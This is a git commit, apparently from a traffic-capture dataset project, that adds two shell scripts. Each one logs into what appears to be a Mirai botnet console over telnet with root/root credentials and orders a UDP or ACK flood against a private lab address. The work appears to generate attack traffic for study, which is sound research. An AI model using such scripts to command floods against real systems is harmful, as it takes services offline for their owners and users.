f6e57903d766c0329b7d3fe2f32ef8d20698cbd7
Robert <robert@localhost.localdomain>
2019-11-06 14:44:19 -0100

    Adding Mirai Capture

---
+++ captures/capture-180-mirai/scripts/attack0.sh
@@ -0,0 +1,7 @@
+#!/bin/sh
+
+DURATION="$1"
+
+(echo "l"; sleep 2; echo "root"; sleep 2; echo "root"; sleep 10; echo "udpplain 172.16.233.33 $DURATION"; sleep 10; echo "quit" ) | telnet 172.16.233.23
+
+
---
+++ captures/capture-180-mirai/scripts/attack2.sh
@@ -0,0 +1,6 @@
+#!/bin/sh
+
+DURATION="$1"
+
+(echo "l"; sleep 2; echo "root"; sleep 2; echo "root"; sleep 10; echo "ack 172.16.233.33 $DURATION"; sleep 10; echo "quit" ) | telnet 172.16.233.23
+
